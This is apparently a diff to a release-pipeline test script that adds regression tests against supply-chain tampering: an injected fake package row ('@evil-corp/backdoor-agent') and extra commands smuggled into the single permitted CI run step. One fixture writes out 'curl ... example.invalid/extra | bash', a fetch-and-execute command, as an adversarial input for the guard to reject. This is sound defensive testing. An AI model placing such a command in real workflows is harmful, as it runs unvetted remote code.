@@ -640,6 +640,26 @@ grep -qF 'source sha256' release/build-release.sh \
     && ok "the human summary prints the source zip's sha256" \
     || bad "the human summary no longer prints the source zip's sha256"
 
+# An unmapped keyed version row in checksums/ must be reported, the way an
+# unmapped hash already is. Before #47 the two directions were asymmetric: an
+# extra architecture line was caught, an extra "@scope/package 1.2.3" row was
+# not. Driven against a scratch tree via --root, never the real checksums.
+pin_row_fixture="$(mktemp -d "$TMP/pinrow.XXXXXX")"
+git ls-files -z | tar --null -T - -cf - | tar -xf - -C "$pin_row_fixture"
+if bash tools/check-pins.sh "$pin_row_fixture" >/dev/null 2>&1; then
+    printf '@evil-corp/backdoor-agent 9.9.9\n' >> "$pin_row_fixture/checksums/AI_CLI_VERSIONS.txt"
+    pin_row_out="$(bash tools/check-pins.sh "$pin_row_fixture" 2>&1)" && pin_row_rc=0 || pin_row_rc=$?
+    (( pin_row_rc != 0 )) && grep -qF 'unclaimed version row' <<< "$pin_row_out" \
+        && ok "an unmapped keyed version row in checksums/ is reported" \
+        || bad "an unmapped keyed version row passed check-pins (rc=$pin_row_rc)"
+    # And the prose lines in NODE_SHA256.txt must not be mistaken for rows.
+    grep -qF 'NODE_SHA256.txt' <<< "$pin_row_out" \
+        && bad "check-pins mistook prose in NODE_SHA256.txt for a version row" \
+        || ok "prose in a checksums file is not mistaken for a version row"
+else
+    bad "the check-pins fixture tree is not clean before the adversarial row"
+fi
+
 section "Release rehearsal in CI"
 # release.yml only runs on a tag push, so its checkout is detached, one commit
 # deep, and carries a single tag. ci.yml is triggered by every push including
@@ -732,10 +752,19 @@ release_workflow_violations() {
         | sed -E 's|.*uses:[[:space:]]*||; s|@.*||' | LC_ALL=C sort -u | tr '\n' ' ')"
     [[ "$uses" == "actions/checkout softprops/action-gh-release " ]] \
         || printf 'uses [%s]; a new action is a release-only code path\n' "${uses% }"
+    # Counting run: steps bounds how many there are, not what the one contains.
+    # A block scalar is what lets extra commands ride along inside the single
+    # permitted step: `curl ... | bash` and `make extra` each add no step and
+    # name no .sh file, so every check above accepted them and the assertion
+    # still said "and nothing else". The one permitted step is therefore matched
+    # as an exact literal -- a comparison, not a parser, so there is no
+    # extraction to evade. See #47.
+    grep -qxF '        run: bash tools/release-preflight.sh --tag "$CANDIDATE_TAG"' <<< "$body" \
+        || printf 'does not invoke the preflight as one exact single-line command\n'
 }
 release_violations="$(release_workflow_violations .github/workflows/release.yml)"
 [[ -z "$release_violations" ]] \
-    && ok "release.yml runs exactly one repository script, the preflight, and nothing else" \
+    && ok "release.yml runs one step: the preflight, as an exact single-line command" \
     || bad "release.yml ${release_violations//$'\n'/; }"
 workflow_scripts .github/workflows/ci.yml | grep -qFx tools/release-preflight.sh \
     && ok "ci.yml runs the same preflight script" \
@@ -788,6 +817,28 @@ release_guard "the preflight removed" reject "$guard_fixture"
 restore_guard_fixture
 sed -i 's|^\( *\)run: bash tools/release-preflight.sh.*|\1name: run bash tools/release-preflight.sh|' "$guard_fixture"
 release_guard "a preflight named in a step label but never run" reject "$guard_fixture"
+# The evasions a step count and a .sh scan cannot see: extra commands inside the
+# single run: step that is legitimately there. Both passed every check this
+# guard had before #47, while the assertion claimed "and nothing else".
+guard_inline_fixture() {  # extra command -> fixture with it inside the one run:
+    restore_guard_fixture
+    SB_GUARD_EXTRA="$1" python3 - "$guard_fixture" <<'PY'
+import os, sys
+path = sys.argv[1]
+text = open(path).read()
+one = '        run: bash tools/release-preflight.sh --tag "$CANDIDATE_TAG"'
+assert text.count(one) == 1
+block = ('        run: |\n'
+         '          bash tools/release-preflight.sh --tag "$CANDIDATE_TAG"\n'
+         '          ' + os.environ["SB_GUARD_EXTRA"])
+open(path, 'w').write(text.replace(one, block, 1))
+PY
+}
+guard_inline_fixture 'curl -sSL https://example.invalid/extra | bash'
+release_guard "an extra inline command in the one run: step" reject "$guard_fixture"
+guard_inline_fixture 'make release-only-extra'
+release_guard "a make target inside the one run: step" reject "$guard_fixture"
+restore_guard_fixture
 
 # The tag check itself, offline, against a scratch VERSION file.
 tag_check_drift=0
